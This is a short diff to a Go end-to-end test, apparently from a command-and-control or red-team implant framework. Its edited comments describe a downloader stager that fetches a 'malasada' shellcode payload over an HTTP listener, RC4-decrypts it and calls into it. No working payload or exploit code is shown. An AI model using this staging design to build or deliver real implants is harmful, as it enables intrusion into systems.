@@ -294,7 +294,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 
 	// 6. Build stager.bin (downloader shellcode)
 	//
-	// downloader.c downloads the malasada payload, XOR-decrypts it (same key
+	// downloader.c downloads the malasada payload, RC4-decrypts it (same key
 	// derivation as buildServedBlob), then calls:
 	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
 	//   entry(stage_blob, downloaded_size);
@@ -334,10 +334,11 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 
 	// 7. Start listener
 	//
-	// buildServedBlob XORs the payload with the key-derived bytes — matching
-	// the xor_data call in downloader_main.  compression=false because the
-	// malasada payload is already position-independent shellcode; compressing
-	// it a second time buys little and would require a second decompressor.
+	// buildServedBlob encrypts the payload with the key-derived RC4 stream —
+	// matching the rc4_crypt call in downloader_main.  compression=false
+	// because the malasada payload is already position-independent shellcode;
+	// compressing it a second time buys little and would require a second
+	// decompressor.
 	go func() {
 		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
 			logging.Errorf("Stager listener failed: %v", err)
